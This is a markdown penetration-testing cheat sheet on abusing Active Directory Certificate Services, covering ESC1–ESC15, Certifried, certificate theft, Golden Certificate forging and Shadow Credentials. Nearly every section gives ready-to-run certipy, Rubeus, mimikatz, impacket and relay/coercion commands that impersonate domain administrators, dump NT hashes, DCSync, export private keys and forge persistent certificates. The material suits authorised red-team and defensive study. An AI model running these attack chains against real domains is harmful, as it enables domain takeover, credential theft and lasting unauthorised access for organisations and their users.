# AD - AD CS (Certificate Services) Abuse

## Table of Contents
- [Primer & Workflow](#primer--workflow)
- [Enumeration](#enumeration)
- [Using a Certificate (auth / PKINIT / UnPAC-the-hash)](#using-a-certificate-auth--pkinit--unpac-the-hash)
- [ESC1 - Enrollee Supplies Subject + Client Auth](#esc1---enrollee-supplies-subject--client-auth)
- [ESC2 - Any Purpose / No EKU](#esc2---any-purpose--no-eku)
- [ESC3 - Enrollment Agent](#esc3---enrollment-agent)
- [ESC4 - Vulnerable Template ACL](#esc4---vulnerable-template-acl)
- [ESC5 - Vulnerable PKI Object ACL](#esc5---vulnerable-pki-object-acl)
- [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6---editf_attributesubjectaltname2)
- [ESC7 - Vulnerable CA ACL (ManageCA / ManageCertificates)](#esc7---vulnerable-ca-acl-manageca--managecertificates)
- [ESC8 - HTTP Enrollment Relay](#esc8---http-enrollment-relay)
- [ESC9 - No Security Extension](#esc9---no-security-extension)
- [ESC10 - Weak Certificate Mappings](#esc10---weak-certificate-mappings)
- [ESC11 - Relay to ICPR (RPC)](#esc11---relay-to-icpr-rpc)
- [ESC13 - Issuance Policy to Group](#esc13---issuance-policy-to-group)
- [ESC14 - Weak Explicit Mapping (altSecurityIdentities)](#esc14---weak-explicit-mapping-altsecurityidentities)
- [ESC15 / EKUwu (CVE-2024-49019)](#esc15--ekuwu-cve-2024-49019)
- [Certifried (CVE-2022-26923)](#certifried-cve-2022-26923)
- [Certificate Theft (THEFT1-5)](#certificate-theft-theft1-5)
- [Golden Certificate (forging with the CA key)](#golden-certificate-forging-with-the-ca-key)
- [Shadow Credentials (msDS-KeyCredentialLink)](#shadow-credentials-msds-keycredentiallink)
- [ESC Decision Table](#esc-decision-table)

For coercion and the NTLM relay flows that drive ESC8/ESC11 see [ntlm-relay.md](ntlm-relay.md). For PKINIT-derived TGTs, PtT, and UnPAC context see [kerberos.md](kerberos.md). For the ACL edges (GenericWrite, WriteDACL, AddKeyCredentialLink) that unlock ESC4/ESC5/ESC7/Shadow Creds see [acl-abuse.md](acl-abuse.md). For CA-key theft as persistence see [domain-dominance.md](domain-dominance.md).

---

## Primer & Workflow

AD CS issues X.509 certificates from **templates**. A certificate that carries a **client-authentication EKU** (Client Authentication `1.3.6.1.5.5.7.3.2`, PKINIT Client Auth `1.3.6.1.5.2.3.4`, Smart Card Logon `1.3.6.1.4.1.311.20.2.2`, or Any Purpose / no EKU) can be used to authenticate to AD via **PKINIT**, yielding a TGT (and, via UnPAC-the-hash, the account's NT hash).

The identity a certificate authenticates as comes from its **SAN** (Subject Alternative Name — a UPN or DNS name). The whole ESC family is about getting the CA to put an *attacker-chosen* SAN (e.g. `administrator@domain.local`) into a client-auth certificate you are allowed to enrol.

Since the May 2022 patch (KB5014754), client-auth certs must embed the **SID security extension** (`szOID-NTDS-CA-SECURITY-EXT` = `1.3.6.1.4.1.311.25.2`) and the DC maps *strongly* by SID. ESC9/ESC10/ESC14 are all about defeating or bypassing that strong mapping. Supply `-sid <SID>` to `certipy req` when a strong mapping is enforced.

Standard loop: `certipy find -vulnerable` → pick an ESC → `certipy req ...` to obtain a `.pfx` → `certipy auth -pfx ...` to get a TGT + NT hash.

---

## Enumeration

```bash
# Certipy (4.x). Requires creds; -vulnerable filters to abusable templates, -stdout prints inline.
certipy find -u user@domain.local -p 'Password123' -dc-ip <ip> -vulnerable -stdout
certipy find -u user@domain.local -p 'Password123' -dc-ip <ip> -stdout          # everything
certipy find -u user@domain.local -p 'Password123' -dc-ip <ip> -bloodhound      # BloodHound-ingestible zip
certipy find -u user@domain.local -hashes :<nthash> -dc-ip <ip> -vulnerable -stdout
# Output also written as .txt/.json; note the CA name and the CA hostname for later -ca / -target flags.

# netexec module
nxc ldap <ip> -u user -p 'Password123' -M adcs
```

```cmd
:: Certify (Windows)
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser        :: only what the current user can enrol
Certify.exe cas                                  :: list CAs and their hostnames
```

Note from the output: the **CA name** (`-ca`), the **CA DNS host** (for ESC8/ESC11 relay targets), which templates are **enabled** on the CA, who has **enrollment rights**, and the flags (`ENROLLEE_SUPPLIES_SUBJECT`, EKUs, `NO_SECURITY_EXTENSION`, Manager Approval, `ManageCA`/`ManageCertificates` principals).

---

## Using a Certificate (auth / PKINIT / UnPAC-the-hash)

Every ESC below ends here: you have a `.pfx`, now turn it into a TGT and/or NT hash.

```bash
# PKINIT: get a TGT, and certipy auto-recovers the NT hash via UnPAC-the-hash
certipy auth -pfx administrator.pfx -dc-ip <ip>
certipy auth -pfx administrator.pfx -dc-ip <ip> -domain domain.local -username administrator  # if SAN is ambiguous
# -> writes administrator.ccache and prints the NT hash

export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local

# PKINITtools alternative (when certipy auth chokes on the KDC)
python3 gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass '' domain.local/administrator administrator.ccache
export KRB5CCNAME=administrator.ccache
python3 getnthash.py -key <AS-REP-encryption-key-from-gettgtpkinit> domain.local/administrator
```

```cmd
:: Rubeus: request a TGT from a pfx and pull the NT hash (UnPAC-the-hash) in one go
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:pfxpass /getcredentials /nowrap /ptt
```

**Schannel fallback** — if the DC enforces strong (SID) mapping and PKINIT fails, authenticate over LDAPS with the cert instead:

```bash
certipy auth -pfx administrator.pfx -dc-ip <ip> -ldap-shell        # LDAP bind with the cert, interactive shell
```

---

## ESC1 - Enrollee Supplies Subject + Client Auth

**Condition:** template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (requester supplies SAN), a client-auth EKU, and low-privileged enrollment rights, with no manager approval. You name the SAN → impersonate anyone.

```bash
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -ca 'CORP-CA' -template 'ESC1-Template' -upn administrator@domain.local
# add -sid <admin SID> if strong mapping is enforced; -dns dc01.domain.local for a machine target
certipy auth -pfx administrator.pfx -dc-ip <ip>
```

```cmd
Certify.exe request /ca:CA-HOST\CORP-CA /template:ESC1-Template /altname:administrator
:: convert the emitted cert.pem to pfx, then Rubeus asktgt /certificate:...
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

---

## ESC2 - Any Purpose / No EKU

**Condition:** template EKU is **Any Purpose** (`2.5.29.37.0`) or **empty (no EKU / SubCA)**. Such a cert works for client auth (and everything else). If the template also lets you supply the subject, treat it exactly like ESC1; otherwise use it as an enrollment-agent-style cert to sign requests for others (as in ESC3).

```bash
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -ca 'CORP-CA' -template 'ESC2-Template' -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <ip>
```

---

## ESC3 - Enrollment Agent

**Condition:** template grants the **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`). You enrol for that agent cert, then use it to request a certificate **on behalf of** another user against any template that permits enrollment-agent enrollment.

```bash
# 1. Get the enrollment-agent cert
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' -template 'ESC3-Agent'
# 2. Use it to request a cert AS administrator
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' \
  -template 'User' -on-behalf-of 'DOMAIN\administrator' -pfx user.pfx
certipy auth -pfx administrator.pfx -dc-ip <ip>
```

`-on-behalf-of` takes the **NetBIOS** form `DOMAIN\user`.

---

## ESC4 - Vulnerable Template ACL

**Condition:** you have **write access** (GenericWrite/GenericAll/WriteDacl/WriteOwner/WriteProperty) over a **certificate template object**. Rewrite the template into an ESC1 configuration, exploit, then restore it.

```bash
# Overwrite template with a vulnerable (ESC1-style) config; certipy saves the old config to a .json
certipy template -u user@domain.local -p 'Password123' -dc-ip <ip> -template 'VulnTemplate' -write-default-configuration
# (older/newer certipy flag: -save-old writes VulnTemplate.json before overwriting)

# Now exploit as ESC1
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <ip>

# Restore the original configuration (be a good guest / avoid breaking the lab)
certipy template -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -template 'VulnTemplate' -configuration VulnTemplate.json
```

---

## ESC5 - Vulnerable PKI Object ACL

**Condition:** attacker control over an object in the PKI chain that isn't the template itself — the **CA server's computer account**, the **CA AD object** (`CN=...,CN=Enrollment Services,CN=Public Key Services,...`), the `NTAuthCertificates` object, or a GPO/OU affecting the CA host. Compromising any of these yields CA control → any of ESC6/ESC7/Golden Certificate.

```bash
# Enumerate the PKI container ACLs (look for non-admin principals with write)
certipy find -u user@domain.local -p 'Password123' -dc-ip <ip> -stdout | grep -iA5 'Object Control'
dacledit.py -action read -target-dn 'CN=CORP-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' \
  domain.local/user:'Password123'
```

There is no single command — ESC5 is "you own a PKI object, now pivot to CA compromise." If it's the CA host computer account, get SYSTEM there and read/forge with the CA key (see Golden Certificate). If it's the CA AD object, grant yourself `ManageCA` (→ ESC7).

---

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition:** the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set, so it honours a requester-supplied SAN **on any template**, even ones without enrollee-supplies-subject. Enrol any client-auth template (e.g. `User`) with `-upn`. (The May 2022 patch ignores the SAN for mapping unless combined with ESC9/ESC10 conditions, so on patched DCs pair ESC6 with a weak-mapping target.)

```bash
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -ca 'CORP-CA' -template 'User' -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <ip>
```

Check the flag: `certipy find` shows `User Specified SAN: Enabled`, or on the CA host `certutil -getreg policy\EditFlags`.

---

## ESC7 - Vulnerable CA ACL (ManageCA / ManageCertificates)

**Condition:** you hold **ManageCA** (CA administrator) or **ManageCertificates** (certificate manager / officer) rights on the CA. Two paths:

Path A — **ManageCA → enable EDITF (ESC6)** or grant yourself officer rights:

```bash
# Grant yourself the officer (ManageCertificates) right
certipy ca -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' -add-officer user
```

Path B — **officer approves your own SubCA request (ESC7 → ESC1)**. Enable a template that allows SAN, submit a request (it goes to pending), then approve and retrieve it:

```bash
# 1. Enable the built-in SubCA template on the CA
certipy ca -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' -enable-template 'SubCA'
# 2. Request it with a spoofed SAN -> DENIED, but note the returned Request ID
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -ca 'CORP-CA' -template 'SubCA' -upn administrator@domain.local
# 3. As officer, issue the pending request
certipy ca -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' -issue-request <REQ_ID>
# 4. Retrieve the now-issued cert
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' -retrieve <REQ_ID>
certipy auth -pfx administrator.pfx -dc-ip <ip>
```

---

## ESC8 - HTTP Enrollment Relay

**Condition:** the CA runs the **Web Enrollment** interface (`http://ca/certsrv/`) with NTLM auth and no channel binding/EPA. Coerce a privileged machine (e.g. a DC) to authenticate and **relay** that NTLM to the enrollment endpoint, requesting a client-auth cert as the coerced account. Full coercion + relay mechanics live in [ntlm-relay.md](ntlm-relay.md).

```bash
# certipy relay (built-in web-enrollment relay)
certipy relay -target 'http://ca.domain.local' -template 'DomainController'
# ntlmrelayx equivalent
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# then coerce the DC toward your relay host (see ntlm-relay.md)
python3 PetitPotam.py -u user -p 'Pass' <relay-host-ip> dc01.domain.local
impacket-printerbug domain.local/user:'Pass'@dc01.domain.local <relay-host-ip>
```

Relay yields a DC (or target machine) certificate → `certipy auth -pfx dc01.pfx` → DC TGT → DCSync. Use template `DomainController`/`Machine` for computers, `User` for user coercion.

---

## ESC9 - No Security Extension

**Condition:** template has `CT_FLAG_NO_SECURITY_EXTENSION` in `msPKI-Enrollment-Flag`, so issued certs **omit the SID security extension**. Combined with a DC that maps by UPN, and **write access over a victim** (e.g. via GenericWrite or Shadow Creds), you set the victim's UPN to a target admin, enrol as the victim (cert with no SID → maps by UPN), revert, and authenticate as the admin.

```bash
# 1. Set victim's UPN to the target (no @ suffix so it matches the admin's sAMAccountName)
certipy account update -u attacker@domain.local -p 'Password123' -dc-ip <ip> -user victim -upn administrator
# 2. Enrol the ESC9 template as the victim (whose creds/hash you control)
certipy req -u victim@domain.local -hashes :<victim_nthash> -dc-ip <ip> \
  -ca 'CORP-CA' -template 'ESC9-Template'
# 3. Revert the victim's UPN
certipy account update -u attacker@domain.local -p 'Password123' -dc-ip <ip> -user victim -upn victim@domain.local
# 4. Authenticate: cert has UPN=administrator and no SID, so it maps to the admin
certipy auth -pfx administrator.pfx -dc-ip <ip> -domain domain.local
```

---

## ESC10 - Weak Certificate Mappings

**Condition:** DC registry weakens cert mapping. Case 1: `CertificateMappingMethods = 0x4` (UPN mapping enabled for Schannel). Case 2: `StrongCertificateBindingEnforcement = 0` (Kerberos no longer requires the SID extension). Same abuse as ESC9 without needing a vulnerable template — flip a controlled victim's UPN to the target, enrol *any* client-auth template, authenticate as the target.

```bash
# Registry (read on the DC): HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\...\CertificateMappingMethods
#                            HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement

# Case 2 (Kerberos, StrongCertificateBindingEnforcement=0): identical flow to ESC9
certipy account update -u attacker@domain.local -p 'Password123' -user victim -upn administrator
certipy req -u victim@domain.local -hashes :<victim_nthash> -dc-ip <ip> -ca 'CORP-CA' -template 'User'
certipy account update -u attacker@domain.local -p 'Password123' -user victim -upn victim@domain.local
certipy auth -pfx administrator.pfx -dc-ip <ip> -domain domain.local

# Case 1 (Schannel, CertificateMappingMethods=0x4): set victim UPN to a target with no UPN (e.g. DC$@... form)
# then authenticate over LDAPS with -ldap-shell
certipy account update -u attacker@domain.local -p 'Password123' -user victim -upn 'dc01$@domain.local'
certipy req -u victim@domain.local -hashes :<victim_nthash> -dc-ip <ip> -ca 'CORP-CA' -template 'User'
certipy auth -pfx dc01.pfx -dc-ip <ip> -ldap-shell
```

---

## ESC11 - Relay to ICPR (RPC)

**Condition:** the CA's RPC enrollment interface (**MS-ICPR**, `ICertPassage`) does **not** enforce packet privacy (`IF_ENFORCEENCRYPTICERTREQUEST` unset). Relay coerced NTLM to the CA over RPC (port 135/dynamic) to enrol a cert — the RPC analogue of ESC8, no web endpoint needed.

```bash
certipy relay -target 'rpc://ca.domain.local' -template 'DomainController'
# then coerce the DC toward the relay host (see ntlm-relay.md), auth the resulting pfx as in ESC8
```

---

## ESC13 - Issuance Policy to Group

**Condition:** an enrollable template has an **issuance policy** OID whose `msDS-OIDToGroupLink` maps to a **privileged AD group**. Enrolling the template puts that group's SID in your certificate → PKINIT logon grants you the group membership in your token, with no ACL over the group itself.

```bash
# certipy find flags templates with a linked issuance policy as ESC13
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' -template 'ESC13-Template'
certipy auth -pfx user.pfx -dc-ip <ip>       # resulting TGT/token carries the linked group's SID
```

---

## ESC14 - Weak Explicit Mapping (altSecurityIdentities)

**Condition:** you have **write access to a target's `altSecurityIdentities`** attribute (explicit certificate mapping). Write a mapping that points at a certificate you control (or a weak issuer+serial / issuer+subject string), then authenticate with your cert to log on as the target. This is the explicit-mapping cousin of ESC9/10.

```bash
# Write a strong X509 mapping (e.g. Issuer+SerialNumber) to your controlled cert onto the victim
certipy account update -u attacker@domain.local -p 'Password123' -dc-ip <ip> \
  -user victim -alt-security-identities 'X509:<I>DC=local,DC=domain,CN=CORP-CA<SR>1200000000...'
# bloodyAD equivalent
bloodyAD --host dc01.domain.local -d domain.local -u attacker -p 'Password123' \
  set object victim altSecurityIdentities -v 'X509:<I>...<SR>...'
# then authenticate with your cert mapped to the victim
certipy auth -pfx yourcert.pfx -dc-ip <ip> -username victim -domain domain.local
```

Weak forms (`X509:<S>` subject-only, or `X509:<I><SR>` with a guessable serial) are the abusable ones; issuer+subject and subject-only mappings are considered weak by KB5014754.

---

## ESC15 / EKUwu (CVE-2024-49019)

**Condition:** an enrollable **schema version 1** template with enrollee-supplies-subject. Because v1 templates don't pin application policies, you can inject arbitrary **Application Policies** into the CSR — e.g. add **Client Authentication** to a template that only had Server Authentication, or add **Certificate Request Agent** to pivot into an ESC3-style on-behalf-of.

```bash
# Inject Client Authentication into a v1 template (e.g. the default WebServer) and spoof the SAN
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' \
  -template 'WebServer' -upn administrator@domain.local \
  -application-policies 'Client Authentication'
certipy auth -pfx administrator.pfx -dc-ip <ip>

# Variant: inject Certificate Request Agent (1.3.6.1.4.1.311.20.2.1) -> then do ESC3 on-behalf-of
certipy req -u user@domain.local -p 'Password123' -dc-ip <ip> -ca 'CORP-CA' \
  -template 'WebServer' -application-policies '1.3.6.1.4.1.311.20.2.1'
```

Requires certipy with `-application-policies` support (4.8.2+).

---

## Certifried (CVE-2022-26923)

**Condition:** any user who can create/control a computer account (`MachineAccountQuota > 0`) sets that machine's `dNSHostName` to match a DC's, then enrols the default `Machine`/`User` template — the cert's SID-based identity resolves to the DC. Certipy automates it. Largely patched by KB5014754, but common in older labs.

```bash
certipy account create -u user@domain.local -p 'Password123' -dc-ip <ip> \
  -user 'EVIL$' -pass 'Evil123!' -dns dc01.domain.local
certipy req -u 'EVIL$'@domain.local -p 'Evil123!' -dc-ip <ip> -ca 'CORP-CA' -template 'Machine'
certipy auth -pfx dc01.pfx -dc-ip <ip>
```

---

## Certificate Theft (THEFT1-5)

Reuse certs already present on a compromised host. Classifications from *Certified Pre-Owned*.

- **THEFT1 — export via Crypto APIs** (exportable private key in a user/machine store):

```cmd
mimikatz # crypto::certificates /systemstore:CURRENT_USER /export
mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /export
Certify.exe pkcs12 ...            :: or export via CertUtil / SharpDPAPI below
```

- **THEFT2 — user DPAPI-protected private keys** (non-exportable, decrypt via masterkey):

```cmd
SharpDPAPI.exe certificates                       :: current user
mimikatz # dpapi::cred / dpapi::masterkey /rpc     :: then dpapi::capi to unprotect the key
```

- **THEFT3 — machine DPAPI-protected private keys** (SYSTEM required):

```cmd
SharpDPAPI.exe certificates /machine
mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export
```

- **THEFT4 — harvest certificate files from disk** (`.pfx .p12 .pem .key .crt`):

```bash
# Linux/remote share sweep
grep -rlE 'BEGIN (RSA |ENCRYPTED |)PRIVATE KEY' /mnt/share 2>/dev/null
```
```powershell
Get-ChildItem -Recurse -Include *.pfx,*.p12,*.pem,*.key -Path C:\,\\share\ -ErrorAction SilentlyContinue
```

- **THEFT5 — NTLM hash via PKINIT (UnPAC-the-hash)**: turn a client-auth cert/TGT into the account's NT hash. See [Using a Certificate](#using-a-certificate-auth--pkinit--unpac-the-hash).

```cmd
Rubeus.exe asktgt /user:victim /certificate:victim.pfx /password:pfxpass /getcredentials /nowrap
```

A stolen user/machine cert authenticates for as long as it is valid regardless of password resets — a persistence primitive (PERSIST1).

---

## Golden Certificate (forging with the CA key)

With the **CA's private key** (stolen from the CA host via THEFT1-3, or CA computer/host compromise via ESC5) you can forge a client-auth certificate for **any** principal offline — no enrollment, no DC interaction until you authenticate. Domain-wide persistence that survives password resets and template fixes.

```bash
# Extract the CA cert+key on the CA host (SYSTEM):
#   mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export   -> yields the CA .pfx
# Forge an admin cert offline
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@domain.local \
  -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'
certipy auth -pfx administrator_forged.pfx -dc-ip <ip>
```

```cmd
:: ForgeCert (Windows)
ForgeCert.exe --CaCertPath CORP-CA.pfx --CaCertPassword pass --Subject "CN=User" \
  --SubjectAltName administrator@domain.local --NewCertPath admin.pfx --NewCertPassword pass
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pass /ptt
```

Include `-sid <admin SID>` in `certipy forge` if strong SID mapping is enforced.

---

## Shadow Credentials (msDS-KeyCredentialLink)

**Condition:** you hold write over a target's **`msDS-KeyCredentialLink`** (via `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` — see [acl-abuse.md](acl-abuse.md)). Add an attacker-controlled key credential (a raw public key in the KeyCredentialLink), then PKINIT-authenticate as the target using the matching private key, and pull the NT hash. Works on users *and* computers; does not touch the account's password.

```bash
# certipy shadow auto: add key -> PKINIT -> recover NT hash -> clean up, in one command
certipy shadow auto -u attacker@domain.local -p 'Password123' -dc-ip <ip> -account victim
# manual sub-commands
certipy shadow add   -u attacker@domain.local -p 'Password123' -account victim   # returns DeviceID + pfx
certipy shadow list  -u attacker@domain.local -p 'Password123' -account victim
certipy shadow clear -u attacker@domain.local -p 'Password123' -account victim   # remove your key

# pywhisker (alternative), then PKINIT with the emitted pfx
pywhisker.py -d domain.local -u attacker -p 'Password123' --target victim --action add
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <pass> domain.local/victim victim.ccache
```

```cmd
:: Whisker (Windows) then Rubeus
Whisker.exe add /target:victim
Rubeus.exe asktgt /user:victim /certificate:<b64 pfx> /password:<pass> /getcredentials /nowrap
```

Prime use: computer accounts. Shadow-cred a computer → its TGT → S4U2Self local admin, or feed the machine into an RBCD chain (see [kerberos.md](kerberos.md)).

---

## ESC Decision Table

| Vulnerable condition (from `certipy find`) | ESC | Exploit command | Prereq |
|---|---|---|---|
| Enrollee supplies subject + client-auth EKU | ESC1 | `certipy req -template T -upn admin@dom` | enroll rights |
| Any Purpose / no EKU | ESC2 | `certipy req -template T -upn admin@dom` | enroll rights |
| Certificate Request Agent EKU | ESC3 | agent cert → `req -on-behalf-of DOM\admin -pfx` | enroll rights |
| Write over a template object | ESC4 | `certipy template -write-default-configuration` → ESC1 | GenericWrite on template |
| Write over a PKI object (CA host/object) | ESC5 | pivot to CA control → ESC6/7 / Golden Cert | write on PKI object |
| CA honours requester SAN (EDITF flag) | ESC6 | `certipy req -template User -upn admin@dom` | enroll rights (+weak map if patched) |
| ManageCA / ManageCertificates on the CA | ESC7 | `ca -add-officer` / `-enable-template SubCA` → issue | CA ACL |
| Web enrollment (HTTP) + NTLM | ESC8 | `certipy relay -target http://ca` + coerce | coercible victim |
| Template `NO_SECURITY_EXTENSION` | ESC9 | flip victim UPN → `req` → revert → `auth` | write over a victim |
| DC weak mapping registry | ESC10 | flip victim UPN → `req` → `auth` | write over a victim |
| ICPR RPC without packet privacy | ESC11 | `certipy relay -target rpc://ca` + coerce | coercible victim |
| Issuance policy linked to a group | ESC13 | `certipy req -template T` → `auth` | enroll rights |
| Write over `altSecurityIdentities` | ESC14 | write X509 mapping → `auth -username victim` | write over a victim |
| v1 template + enrollee supplies subject | ESC15 | `req -application-policies 'Client Authentication' -upn admin@dom` | enroll rights, certipy 4.8.2+ |
| CA private key stolen | Golden Cert | `certipy forge -ca-pfx CA.pfx -upn admin@dom` | CA key |
| Write over `msDS-KeyCredentialLink` | Shadow Cred | `certipy shadow auto -account victim` | write over a victim |
